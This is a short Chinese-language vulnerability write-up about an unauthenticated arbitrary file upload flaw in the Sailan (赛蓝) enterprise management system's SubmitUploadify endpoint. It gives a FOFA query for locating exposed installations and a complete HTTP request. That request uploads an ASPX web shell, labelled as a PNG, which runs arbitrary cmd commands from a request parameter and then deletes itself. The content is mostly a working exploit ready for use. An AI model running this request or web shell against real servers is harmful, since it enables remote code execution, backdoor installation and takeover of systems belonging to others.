# 赛蓝企业管理系统SubmitUploadify存在任意文件上传漏洞

赛蓝企业管理系统 /EHRModule/EHR_Holidays/SubmitUploadify 接口处存在文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。

## fofa

```yaml
body="www.cailsoft.com" || body="赛蓝企业管理系统"
```

## poc

```xml
POST /EHRModule/EHR_Holidays/SubmitUploadify?FolderId=1&UserId=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.2558.72 Safari/537.36
Accept-Ldwk: bG91ZG9uZ3dlbmt1
Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
Connection: close
 
-----------------------------142851345723692939351758052805
Content-Disposition: form-data; name="Filedata"; filename="11.aspx"
Content-Type: image/png
 
<%@ Page Language="Jscript" validateRequest="false" %>
<%
var c=new System.Diagnostics.ProcessStartInfo("cmd");
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;
c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c " + Request.Item["cmd"];
e.Start();
out=e.StandardOutput;
EI=e.StandardError;
e.Close();
Response.Write(out.ReadToEnd() + EI.ReadToEnd());
System.IO.File.Delete(Request.PhysicalPath);
Response.End();%>
-----------------------------142851345723692939351758052805--
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408091056879.png)